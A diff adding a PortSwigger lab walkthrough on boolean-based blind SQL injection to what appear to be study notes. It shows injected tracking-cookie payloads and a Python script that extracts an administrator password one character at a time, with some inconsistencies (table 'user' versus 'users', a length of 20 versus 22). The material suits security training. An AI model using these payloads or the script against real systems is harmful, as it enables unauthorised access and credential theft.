@@ -515,3 +515,104 @@ With blind SQL injection vulnerabilities, many techniques such as `UNION` atta
 
 1. Boolean based blind → return 1 or 0
 2. Time based blind → make a delay if query be ture
+
+**Lab** - [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+
+To solve the lab, log in as the `administrator` user.
+
+**Solution:**
+
+I have a tracking id in cookeis like this :TrackingId=NqZivwgKPtLKDW0x;
+
+I can see “welcome back!” if this trakingId be correct, otherwise nothing.
+
+then I added a boolean codition next of tracking id:
+
+```sql
+TrackingId=NqZivwgKPtLKDW0x' and 1=1-- 
+```
+
+again I see “Welcome back!”
+
+```sql
+TrackingId=NqZivwgKPtLKDW0x' and 1=2--
+```
+
+but this time nothing.
+
+so there is a sqli. first I need to know length of password. so I write this:
+
+```sql
+TrackingId=NqZivwgKPtLKDW0x' and 1<(select length(password) from user where username='administrator')--
+```
+
+again I see “Welcome back!”, so that’s mean the length is greater than of number one. after play with number, I found out the length is 20
+
+```sql
+TrackingId=NqZivwgKPtLKDW0x' and 20=(select length(password) from user where username='administrator')--
+```
+
+again I see “Welcome back!”
+
+Know I need to write a script to extract 20 chars of administrator’s password.
+
+```python
+import requests
+from bs4 import BeautifulSoup as BS
+import re
+from itertools import chain
+
+def _check_bool(query):
+
+    cookies = {
+            "TrackingId":f"NqZivwgKPtLKDW0x' and {query}",
+            "session":"kfZso9yB7U0rwIVOktJhRv4yTNSSnadv",
+            }
+    req= s.get('https://0a7100350360f9e3c0fa0764000900a7.web-security-academy.net', cookies=cookies)
+
+    response = BS(req.text,'html.parser')
+    target = str(response)
+    pattern = r"Welcome"
+
+    res= re.search(pattern,target)
+
+    if res:
+        return True
+    else:
+        return False
+
+def _dump_char():
+
+    # ASCII CHAR a-z ==> 97-122
+    # ASCII 0-9 => 48-57
+    # ASCII CHAR _ => 95
+    # ASCII CHAR , => 44
+    result = ''
+
+    dump_length = 22
+
+    print(dump_length, end="\n", flush=True)
+
+    for l in range(1, dump_length+1):
+        ascii_chars = chain(range(97, 123),
+                range(48, 58), range(95, 96), range(44, 45))
+        for char in ascii_chars:
+            query= f"{char}=ascii(substr((select password from users where username='administrator'),{l},1))--"
+            res = _check_bool(query)
+            if res:
+                print(chr(char), end="", flush=True)
+                result = result + chr(char)
+                break
+
+    print("\n")
+    return result
+
+with requests.Session () as s:
+    print(_dump_char())
+```
